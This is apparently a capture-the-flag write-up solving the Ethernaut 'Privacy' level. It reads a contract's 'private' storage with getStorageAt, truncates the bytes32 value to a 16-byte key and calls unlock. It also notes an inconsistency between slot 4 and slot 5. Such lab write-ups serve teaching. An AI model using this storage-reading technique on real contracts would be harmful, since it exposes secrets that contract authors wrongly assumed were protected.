# Privacy

## Challenge Statement

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

    Understanding how storage works
    Understanding how parameter parsing works
    Understanding how casting works

Tips:

    Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.


## Analysis

The private data is stored in the contract, can we access the right piece of data?
e.g web3.eth.getStorageAt('<target address>', 1)
slot 4 seems to hold the bytes32 data we need which is then cast down to 16 bytes
key_32 = web3.eth.getStorageAt('0x9E829A37115350C2F754d8A6577c2Ec8abf940Cb', 5)
=d51be7a7185442e39eb1e5bd3b462b440c4a6b0f6ac15dfe358adfc2627e7907
take MS 16 bytes = 32 hex chars
python: x = ..; x[:32]
key = 0xd51be7a7185442e39eb1e5bd3b462b44
contract.unlock('0xd51be7a7185442e39eb1e5bd3b462b44')

## Solution

```
$ key_32 = web3.eth.getStorageAt('0x9E829A37115350C2F754d8A6577c2Ec8abf940Cb', 5)
$ python: x = ..; x[:32]
$ console : key = 0xd51be7a7185442e39eb1e5bd3b462b44
$ console : contract.unlock('0xd51be7a7185442e39eb1e5bd3b462b44')
```

## Moral

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": How to read Ethereum contract storage